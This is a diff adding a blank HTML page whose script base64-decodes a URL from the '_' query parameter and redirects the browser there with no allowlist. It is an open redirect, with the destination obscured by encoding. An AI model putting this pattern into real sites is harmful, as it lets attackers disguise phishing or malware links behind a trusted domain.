@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body>
+<script>
+    (function(){
+        try {
+            const p = new URLSearchParams(window.location.search).get('_');
+            if (p) {
+                const u = decodeURIComponent(atob(p.replace(/ /g, '+')).split('').map(c=>'%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
+                if (u && (u.startsWith('http') || u.startsWith('//')) && u !== window.location.href) {
+                    window.location.replace(u);
+                }
+            }
+        } catch(e) {}
+    })();
+</script>
+</body>
+</html>
